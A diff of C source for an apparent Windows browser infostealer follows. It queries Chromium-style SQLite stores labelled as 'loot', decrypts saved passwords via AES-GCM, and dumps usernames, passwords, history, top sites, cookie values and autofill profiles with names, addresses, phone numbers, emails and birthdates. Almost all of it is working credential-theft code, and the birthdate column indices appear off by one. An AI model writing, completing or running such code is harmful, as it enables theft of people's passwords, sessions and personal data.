@@ -16,7 +16,6 @@
 BCRYPT_KEY_HANDLE hKey; // GLOBAL VARIABLE!
 BCRYPT_AUTH_TAG_LENGTHS_STRUCT tagLens; //GLOBAL VARIABLE!
 
-
 typedef struct SQLStatements{
   char* extensionCookies;
   char* history;
@@ -26,7 +25,11 @@ typedef struct SQLStatements{
 } SQLStatements;
 
 void setupSQL(SQLStatements* sql){
+  sql->extensionCookies = "SELECT path, name, value FROM cookies";
+  sql->history = "SELECT url FROM urls";
+  sql->topSites = "SELECT url FROM top_sites";
   sql->loginData = "SELECT origin_url, username_value, password_value FROM logins";
+  sql->webData = "SELECT A.guid, A.street_address, A.city, A.state, A.zipcode, A.country_code, full_name, number, email, day, month, year FROM autofill_profiles A  LEFT OUTER JOIN autofill_profile_names B ON A.guid = B.guid LEFT OUTER JOIN autofill_profile_phones C ON A.guid = C.guid LEFT OUTER JOIN autofill_profile_emails D ON A.guid = D.guid LEFT OUTER JOIN autofill_profile_birthdates E ON A.guid = E.guid LEFT OUTER JOIN autofill_profile_addresses F ON A.guid = F.guid";
 }
 
 PUCHAR AESGCMDecrypt(PUCHAR data, ULONG dataLen, PUCHAR iv, ULONG ivLen, PUCHAR tag){
@@ -372,13 +375,13 @@ int main(int argc, char *argv[]){
       }
       //pick the right statement
       char* sqlreq;
-      if(loot[i] == "Login Data"){
+      if(strcmp(loot[i], "Login Data") == 0){
         sqlreq = sql.loginData;
-      }else if(loot[i] == "History"){
+      }else if(strcmp(loot[i], "History") == 0){
         sqlreq = sql.history;
-      }else if(loot[i] == "Top Sites"){
+      }else if(strcmp(loot[i], "Top Sites") == 0){
         sqlreq = sql.topSites;
-      }else if(loot[i] == "Web Data"){
+      }else if(strcmp(loot[i], "Web Data") == 0){
         sqlreq = sql.webData;
       }else{
         sqlreq = sql.extensionCookies;
@@ -388,25 +391,71 @@ int main(int argc, char *argv[]){
         return -1;
       }
       //TODO step through rows
-      while(sqlite3_step(stmt) == SQLITE_ROW){
-        const char* origin_url = sqlite3_column_text(stmt, 0);
-        const char* username_value = sqlite3_column_text(stmt, 1);
-        const char* password_value = sqlite3_column_blob(stmt, 2);
-        DWORD password_length = (DWORD)sqlite3_column_bytes(stmt, 2);
-        //decrypt password
-        BYTE* iv = malloc(sizeof(BYTE) * 12);
-        BYTE* data = malloc(sizeof(BYTE) * (password_length - 31));
-        BYTE* tag = malloc(sizeof(BYTE) * 16);
-        memcpy(iv, password_value + 3, 12);
-        memcpy(data, password_value + 15, password_length - 31);
-        memcpy(tag, password_value + (password_length - 16), 16);
-        printf("%s: \n", origin_url);
-        printf("username: %s\n", username_value);
-        printf("password: %s\n", AESGCMDecrypt(data, password_length - 31, iv, 12, tag));
-        free(iv);
-        free(data);
-        free(tag);
+      if(strcmp(loot[i], "Login Data") == 0){
+        printf("LOGIN DATA\n");
+        while(sqlite3_step(stmt) == SQLITE_ROW){
+          const char* origin_url = sqlite3_column_text(stmt, 0);
+          const char* username_value = sqlite3_column_text(stmt, 1);
+          const char* encrypted_value = sqlite3_column_blob(stmt, 2);
+          DWORD password_length = (DWORD)sqlite3_column_bytes(stmt, 2);
+          //decrypt password
+          BYTE* iv = malloc(sizeof(BYTE) * 12);
+          BYTE* data = malloc(sizeof(BYTE) * (password_length - 31));
+          BYTE* tag = malloc(sizeof(BYTE) * 16);
+          memcpy(iv, encrypted_value + 3, 12);
+          memcpy(data, encrypted_value + 15, password_length - 31);
+          memcpy(tag, encrypted_value + (password_length - 16), 16);
+          printf("%s: \n", origin_url);
+          printf("username: %s\n", username_value);
+          printf("password: %s\n", AESGCMDecrypt(data, password_length - 31, iv, 12, tag));
+          free(iv);
+          free(data);
+          free(tag);
+        }
+      }else if(strcmp(loot[i], "History") == 0){
+        printf("HISTORY:\n");
+        while(sqlite3_step(stmt) == SQLITE_ROW){
+          const char* url = sqlite3_column_text(stmt, 0);
+          printf("%s\n", url);
+        }
+      }else if(strcmp(loot[i], "Top Sites") == 0){
+        printf("TOP SITES\n");
+        while(sqlite3_step(stmt) == SQLITE_ROW){
+          const char* url = sqlite3_column_text(stmt, 0);
+          printf("%s\n", url);
+        }
+      }else if(strcmp(loot[i], "Web Data") == 0){
+        printf("WEB DATA:\n");
+        while(sqlite3_step(stmt) == SQLITE_ROW){
+          //A.guid, A.street_address, A.city, A.state, A.zipcode, A.country_code, 
+          //full_name, number, email, day, month, year
+          const char* guid = sqlite3_column_text(stmt, 0);
+          const char* street = sqlite3_column_text(stmt, 1);
+          const char* city = sqlite3_column_text(stmt, 2);
+          const char* state = sqlite3_column_text(stmt, 3);
+          const char* zip = sqlite3_column_text(stmt, 4); 
+          const char* country = sqlite3_column_text(stmt, 5); 
+          const char* fullname = sqlite3_column_text(stmt, 6); 
+          const char* phone = sqlite3_column_text(stmt, 7); 
+          const char* email = sqlite3_column_text(stmt, 8); 
+          int day = sqlite3_column_int(stmt, 10); 
+          int month = sqlite3_column_int(stmt, 11); 
+          int year = sqlite3_column_int(stmt, 12); 
+          printf("INFO FOR: %s\n", guid);
+          printf("ADDR: %s, %s, %s, %s, %s\n", street, city, state, country, zip);
+          printf("PERSON: %s, %s, %s\n", fullname, phone, email);
+          printf("BIRTHDATE: %d, %d, %d\n", day, month, year); 
+        }
+      }else{
+        printf("EXTENSION COOKIES\n");
+        while(sqlite3_step(stmt) == SQLITE_ROW){
+          const char* path = sqlite3_column_text(stmt, 0); 
+          const char* name = sqlite3_column_text(stmt, 1); 
+          const char* value = sqlite3_column_text(stmt, 2); 
+          printf("%s, %s, %s\n", path, name, value);
+        }
       }
+      //cleanup
       if(sqlite3_finalize(stmt) != SQLITE_OK){
         printf("[!] Error finalizing statement\n");
         return -1;
@@ -415,6 +464,9 @@ int main(int argc, char *argv[]){
         printf("[!] Error closing DB: %s\n", sqlite3_errmsg(db));
         return -1;
       }
+    }else{
+      //file isnt a sql database, just read it
+      
     }
     free(dest);
     free(src);
